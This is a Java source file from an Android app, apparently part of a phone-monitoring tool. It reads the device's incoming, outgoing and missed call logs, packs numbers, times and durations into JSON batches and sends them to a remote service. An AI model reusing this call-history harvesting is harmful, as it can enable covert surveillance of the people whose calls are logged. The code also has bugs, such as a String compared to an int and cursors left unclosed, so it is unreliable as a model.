package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class ArchiveCall extends AsyncTask<Context, Void, Void> {
	Context mContext;
	RequestDataBaseHelper db;
	private String iType;
	ConvertDate date;
	private String LOG_TAG = "ArchiveCall";
	// private int type;
	private String complete;
	Editor ed;
	SharedPreferences sp;

	private String getDuration(long milliseconds) {
		int seconds = (int) (milliseconds / 1000) % 60; // 280
		int minutes = (int) ((milliseconds / (1000 * 60)) % 60);
		int hours = (int) ((milliseconds / (1000 * 60 * 60)) % 24);
		if (hours < 1)
			return minutes + ":" + seconds;
		return hours + ":" + minutes + ":" + seconds;
	}

	private String readCallLogs() {
		String sendStr = null;
		date = new ConvertDate();
		Cursor callLogCursor = null;
		// Делаем запрос к контент-провайдеру
		// и получаем все данные из таблицы
		for (int i = 0; i < 3; i++) {
			complete = "0";
			switch (i) {
			case (0):
				callLogCursor = mContext.getContentResolver().query(
						android.provider.CallLog.Calls.CONTENT_URI,
						null,
						CallLog.Calls.TYPE + "=?",
						new String[] { String
								.valueOf(CallLog.Calls.INCOMING_TYPE) },
						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
				iType = "1";
				break;
			case (1):
				callLogCursor = mContext.getContentResolver().query(
						android.provider.CallLog.Calls.CONTENT_URI,
						null,
						CallLog.Calls.TYPE + "=?",
						new String[] { String
								.valueOf(CallLog.Calls.OUTGOING_TYPE) },
						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
				iType = "2";

				break;
			case (2):
				callLogCursor = mContext.getContentResolver().query(
						android.provider.CallLog.Calls.CONTENT_URI,
						null,
						CallLog.Calls.TYPE + "=?",
						new String[] { String
								.valueOf(CallLog.Calls.MISSED_TYPE) },
						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
						iType = "3";

				break;
			}
			if (callLogCursor != null) {
				JSONObject archiveCallJson = new JSONObject();

				// Проходим в цикле, пока не дойдём до последней записи
				Logging.doLog(LOG_TAG, "callogCursor != 0 ..");

				while (callLogCursor.moveToNext()) {
					Logging.doLog(LOG_TAG, "callogCursor moveToNext ..");

					// Имя контакта
					String name = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NAME));

					String cacheNumber = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
					// Номер контакта и т.д.
					String number = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.NUMBER));
					long dateTimeMillis = callLogCursor.getLong(callLogCursor
							.getColumnIndex(CallLog.Calls.DATE));
					long durationMillis = callLogCursor.getLong(callLogCursor
							.getColumnIndex(CallLog.Calls.DURATION));

					String duration = getDuration(durationMillis * 1000);

					String dateString = date.getData(dateTimeMillis);

					if (cacheNumber == null)
						cacheNumber = number;
					if (name == null)
						name = "No Name";

					try {
						archiveCallJson.put("time", dateString);
						archiveCallJson.put("number", number);
						if (!iType.equals(3))
							archiveCallJson.put("duration", duration);
						if (sendStr == null)
							sendStr = archiveCallJson.toString();
						else
							sendStr += "," + archiveCallJson.toString();

					} catch (JSONException e) {
						// TODO Автоматически созданный блок catch
						e.printStackTrace();
					}
					if (sendStr.length() >= 10000) {
						Logging.doLog(LOG_TAG, "str >= 10000 ..",
								"str >= 10000 ..");
						sendRequest(sendStr, complete);
						sendStr = null;
					}
				}
			}
			complete = "1";
			Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
			sendRequest(sendStr, complete);
			sendStr = null;
		}
		Logging.doLog(LOG_TAG, "statusCallList 0.", "statusCallList 0.");

		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();
		ed.putString("statusCallList", "0");
		ed.commit();

		callLogCursor.close();

		return null;
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
			dr.sendRequest(str);
			// Logging.doLog(LOG_TAG, str, str);
		}
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
